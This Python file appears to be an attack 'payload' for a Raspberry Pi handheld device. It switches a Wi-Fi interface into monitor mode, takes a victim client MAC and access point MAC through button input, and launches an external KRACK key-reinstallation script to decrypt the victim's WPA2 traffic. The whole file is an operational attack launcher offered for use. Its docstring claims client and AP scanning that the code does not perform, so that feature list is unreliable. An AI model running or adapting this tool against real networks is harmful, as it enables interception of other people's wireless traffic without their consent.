#!/usr/bin/env python3
"""
KTOx *payload* – **KRACK (Key Reinstallation Attack)**
=========================================================
This payload performs a Key Reinstallation Attack (KRACK) against a WPA2
client. This attack allows an attacker to decrypt a user's Wi-Fi traffic.

Features:
- Scans for nearby clients and access points.
- Allows the user to select a target client and AP.
- Performs the KRACK attack using custom scripts.
- The attack runs in a background thread.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start the attack.
    - KEY1: Select the target.
    - KEY2: Select the AP.
    - KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *


def _detect_monitor_iface():
    """Find active monitor-mode interface, prefer wlan1mon over wlan0mon."""
    for iface in ['wlan1mon', 'wlan0mon']:
        if os.path.exists(f'/sys/class/net/{iface}'):
            return iface
    try:
        import subprocess as _sp, re as _re
        out = _sp.run(['iwconfig'], capture_output=True, text=True).stdout
        m = _re.findall(r'^(\w+).*Mode:Monitor', out, _re.MULTILINE)
        if m: return m[0]
    except Exception:
        pass
    return 'wlan0mon'

INTERFACE = _detect_monitor_iface()
TARGET_MAC = ""
AP_MAC = ""
running = True
attack_thread = None

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

def cleanup(*_):
    global running
    running = False
    
    # Kill all the processes
    subprocess.run("killall krack-attack", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "KRACK Attack", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (128 - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (128 - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), f"Target: {TARGET_MAC}", font=FONT, fill="white")
        d.text((5, 50), f"AP: {AP_MAC}", font=FONT, fill="white")
        d.text((5, 100), "OK=Start", font=FONT, fill="cyan")
        d.text((5, 110), "KEY1=Target | KEY2=AP", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"Target: {TARGET_MAC}", font=FONT, fill="white")
        d.text((5, 85), f"AP: {AP_MAC}", font=FONT, fill="white")

    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    draw_ui("attacking")
    
    # Path to krack-attack script
    krack_attack_path = os.path.join(KTOX_ROOT, "krack-scripts", "krack-attack")
    
    # Command to execute
    command = [
        "python3",
        krack_attack_path,
        "--replay",
        "-i",
        INTERFACE,
        "-s",
        AP_MAC,
        "-c",
        TARGET_MAC
    ]
    
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=600)
        
        if process.returncode == 0:
            draw_ui(message_lines=["Attack successful!"])
        else:
            draw_ui(message_lines=["Attack failed!", "Check console."])
            print(stderr)
            
    except subprocess.TimeoutExpired:
        draw_ui(message_lines=["Attack timed out!"])
    except Exception as e:
        draw_ui(message_lines=["Attack failed!", str(e)])
        
    time.sleep(3)

def handle_mac_input_logic(initial_mac, mac_type):
    char_set = "0123456789abcdef:"
    char_index = 0
    input_mac = ""
    
    while running:
        img = Image.new("RGB", (128, 128), "black")
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {mac_type} MAC", font=FONT_TITLE, fill="cyan")
        d.line([(0, 22), (128, 22)], fill="cyan", width=1)
        d.text((5, 40), f"MAC: {input_mac}", font=FONT, fill="white")
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill="cyan")
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill="cyan")
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        if btn == "OK":
            input_mac += char_set[char_index]
            time.sleep(0.2)
        if btn == "KEY1":
            input_mac = input_mac[:-1]
            time.sleep(0.2)
        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)
        if GPIO.input(PINS["KEY2"]) == 0:
            if len(input_mac) == 17:
                return input_mac
            else:
                draw_ui(message_lines=["Invalid MAC!", "Try again."])
                time.sleep(2)
                input_mac = ""
        
        time.sleep(0.1)
    return None

if __name__ == "__main__":
    try:
        # Set interface to monitor mode
        subprocess.run(f"ifconfig {INTERFACE} down", shell=True)
        subprocess.run(f"iwconfig {INTERFACE} mode monitor", shell=True)
        subprocess.run(f"ifconfig {INTERFACE} up", shell=True)
        
        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["OK"]) == 0:
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.start()
                time.sleep(0.3)
            
            if GPIO.input(PINS["KEY1"]) == 0:
                new_mac = handle_mac_input_logic(TARGET_MAC, "Target")
                if new_mac:
                    TARGET_MAC = new_mac
                time.sleep(0.3)

            if GPIO.input(PINS["KEY2"]) == 0:
                new_mac = handle_mac_input_logic(AP_MAC, "AP")
                if new_mac:
                    AP_MAC = new_mac
                time.sleep(0.3)

            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("KRACK Attack payload finished.")
